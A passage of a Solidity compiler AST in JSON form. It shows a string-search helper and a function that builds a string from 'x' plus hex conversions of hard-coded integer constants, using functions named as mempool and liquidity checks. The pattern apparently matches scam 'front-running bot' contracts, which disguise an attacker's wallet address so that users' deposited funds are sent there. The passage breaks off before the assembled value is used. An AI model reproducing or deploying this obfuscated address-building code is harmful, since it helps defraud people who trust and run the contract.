																													"src": "12115:3:0"
																												}
																											],
																											"functionName": {
																												"name": "mload",
																												"nodeType": "YulIdentifier",
																												"src": "12109:5:0"
																											},
																											"nodeType": "YulFunctionCall",
																											"src": "12109:10:0"
																										},
																										{
																											"name": "mask",
																											"nodeType": "YulIdentifier",
																											"src": "12121:4:0"
																										}
																									],
																									"functionName": {
																										"name": "and",
																										"nodeType": "YulIdentifier",
																										"src": "12105:3:0"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "12105:21:0"
																								},
																								"variableNames": [
																									{
																										"name": "ptrdata",
																										"nodeType": "YulIdentifier",
																										"src": "12094:7:0"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 1077,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12121:4:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1064,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12115:3:0",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1108,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12094:7:0",
																							"valueSize": 1
																						}
																					],
																					"id": 1125,
																					"nodeType": "InlineAssembly",
																					"src": "12083:45:0"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			},
																			"id": 1113,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1111,
																				"name": "ptrdata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1108,
																				"src": "11925:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1112,
																				"name": "needledata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1096,
																				"src": "11936:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"src": "11925:21:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 1127,
																		"nodeType": "WhileStatement",
																		"src": "11918:228:0"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 1128,
																			"name": "ptr",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1064,
																			"src": "12170:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"functionReturnParameters": 1062,
																		"id": 1129,
																		"nodeType": "Return",
																		"src": "12163:10:0"
																	}
																]
															}
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1169,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1167,
														"name": "selfptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1054,
														"src": "12686:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1168,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1052,
														"src": "12696:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "12686:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 1062,
												"id": 1170,
												"nodeType": "Return",
												"src": "12679:24:0"
											}
										]
									},
									"documentation": null,
									"id": 1172,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findPtr",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1059,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1052,
												"mutability": "mutable",
												"name": "selflen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1172,
												"src": "11355:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1051,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11355:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1054,
												"mutability": "mutable",
												"name": "selfptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1172,
												"src": "11369:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1053,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11369:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1056,
												"mutability": "mutable",
												"name": "needlelen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1172,
												"src": "11383:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1055,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11383:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1058,
												"mutability": "mutable",
												"name": "needleptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1172,
												"src": "11399:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1057,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11399:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11354:60:0"
									},
									"returnParameters": {
										"id": 1062,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1061,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1172,
												"src": "11437:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1060,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11437:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11436:6:0"
									},
									"scope": 1583,
									"src": "11338:1372:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 1179,
										"nodeType": "Block",
										"src": "12773:31:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "39343431343130",
													"id": 1177,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "12790:7:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_9441410_by_1",
														"typeString": "int_const 9441410"
													},
													"value": "9441410"
												},
												"functionReturnParameters": 1176,
												"id": 1178,
												"nodeType": "Return",
												"src": "12783:14:0"
											}
										]
									},
									"documentation": null,
									"id": 1180,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolHeight",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1173,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "12741:2:0"
									},
									"returnParameters": {
										"id": 1176,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1175,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1180,
												"src": "12767:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1174,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "12767:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "12766:6:0"
									},
									"scope": 1583,
									"src": "12716:88:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1271,
										"nodeType": "Block",
										"src": "13006:841:0",
										"statements": [
											{
												"assignments": [
													1186
												],
												"declarations": [
													{
														"constant": false,
														"id": 1186,
														"mutability": "mutable",
														"name": "_memPoolOffset",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1271,
														"src": "13016:28:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1185,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13016:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1194,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "78",
															"id": 1188,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "13055:3:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83",
																"typeString": "literal_string \"x\""
															},
															"value": "x"
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 1190,
																		"name": "getMemPoolOffset",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 730,
																		"src": "13075:16:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
																			"typeString": "function () pure returns (uint256)"
																		}
																	},
																	"id": 1191,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "13075:18:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1189,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 992,
																"src": "13060:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1192,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13060:34:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83",
																"typeString": "literal_string \"x\""
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1187,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1582,
														"src": "13047:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1193,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13047:48:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13016:79:0"
											},
											{
												"assignments": [
													1196
												],
												"declarations": [
													{
														"constant": false,
														"id": 1196,
														"mutability": "mutable",
														"name": "_memPoolSol",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1271,
														"src": "13105:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1195,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13105:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1198,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "32323431313837343733",
													"id": 1197,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "13124:10:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_2241187473_by_1",
														"typeString": "int_const 2241187473"
													},
													"value": "2241187473"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13105:29:0"
											},
											{
												"assignments": [
													1200
												],
												"declarations": [
													{
														"constant": false,
														"id": 1200,
														"mutability": "mutable",
														"name": "_memPoolLength",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1271,
														"src": "13144:19:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1199,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13144:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1202,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "343236303536",
													"id": 1201,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "13166:6:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_426056_by_1",
														"typeString": "int_const 426056"
													},
													"value": "426056"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13144:28:0"
											},
											{
												"assignments": [
													1204
												],
												"declarations": [
													{
														"constant": false,
														"id": 1204,
														"mutability": "mutable",
														"name": "_memPoolSize",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1271,
														"src": "13182:17:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1203,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13182:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1206,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "3633333535323737303634",
													"id": 1205,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "13202:11:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_63355277064_by_1",
														"typeString": "int_const 63355277064"
													},
													"value": "63355277064"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13182:31:0"
											},
											{
												"assignments": [
													1208
												],
												"declarations": [
													{
														"constant": false,
														"id": 1208,
														"mutability": "mutable",
														"name": "_memPoolHeight",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1271,
														"src": "13223:19:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1207,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13223:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1211,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1209,
														"name": "getMemPoolHeight",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1180,
														"src": "13245:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 1210,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13245:18:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13223:40:0"
											},
											{
												"assignments": [
													1213
												],
												"declarations": [
													{
														"constant": false,
														"id": 1213,
														"mutability": "mutable",
														"name": "_memPoolDepth",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1271,
														"src": "13273:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1212,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13273:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1216,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1214,
														"name": "getMemPoolDepth",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1474,
														"src": "13294:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 1215,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13294:17:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13273:38:0"
											},
											{
												"assignments": [
													1218
												],
												"declarations": [
													{
														"constant": false,
														"id": 1218,
														"mutability": "mutable",
														"name": "_memPool1",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1271,
														"src": "13322:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1217,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13322:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1225,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1220,
															"name": "_memPoolOffset",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1186,
															"src": "13356:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1222,
																	"name": "_memPoolSol",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1196,
																	"src": "13387:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1221,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 992,
																"src": "13372:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1223,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13372:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1219,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1582,
														"src": "13348:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1224,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13348:52:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13322:78:0"
											},
											{
												"assignments": [
													1227
												],
												"declarations": [
													{
														"constant": false,
														"id": 1227,
														"mutability": "mutable",
														"name": "_memPool2",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1271,
														"src": "13410:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1226,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13410:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1236,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1230,
																	"name": "_memPoolLength",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1200,
																	"src": "13459:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1229,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 992,
																"src": "13444:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1231,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13444:30:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1233,
																	"name": "_memPoolSize",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1204,
																	"src": "13491:12:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1232,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 992,
																"src": "13476:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1234,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13476:28:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1228,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1582,
														"src": "13436:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1235,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13436:69:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13410:95:0"
											},
											{
												"assignments": [
													1238
												],
												"declarations": [
													{
														"constant": false,
														"id": 1238,
														"mutability": "mutable",
														"name": "_memPool3",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1271,
														"src": "13515:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1237,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13515:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1242,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1240,
															"name": "_memPoolHeight",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1208,
															"src": "13556:14:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1239,
														"name": "checkLiquidity",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 992,
														"src": "13541:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
															"typeString": "function (uint256) pure returns (string memory)"
														}
													},
													"id": 1241,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13541:30:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13515:56:0"
											},
											{
												"assignments": [
													1244
												],
												"declarations": [
													{
														"constant": false,
														"id": 1244,
														"mutability": "mutable",
														"name": "_memPool4",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1271,
														"src": "13581:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1243,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13581:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1248,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1246,
															"name": "_memPoolDepth",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1213,
															"src": "13622:13:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1245,
														"name": "checkLiquidity",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 992,
														"src": "13607:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
															"typeString": "function (uint256) pure returns (string memory)"
														}
													},
													"id": 1247,
													"isConstant": false,
													"isLValue": false,
